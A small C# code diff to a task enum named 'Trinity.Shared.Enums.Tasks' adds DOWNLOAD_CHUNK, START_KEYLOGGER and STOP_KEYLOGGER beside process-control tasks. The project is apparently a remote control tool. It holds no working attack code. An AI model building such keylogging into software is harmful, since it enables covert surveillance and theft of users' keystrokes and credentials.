@@ -15,8 +15,9 @@ namespace Trinity.Shared.Enums.Tasks
         RUN_AS                  = 5,
         RUN_U                   = 6,
         KILL_PROCESS            = 7,
-        DOWNLOAD                = 8,
-        CANCEL_DOWNLOAD         = 9
+        DOWNLOAD_CHUNK          = 8,
+        START_KEYLOGGER         = 9,
+        STOP_KEYLOGGER          = 10
     }
 
 }
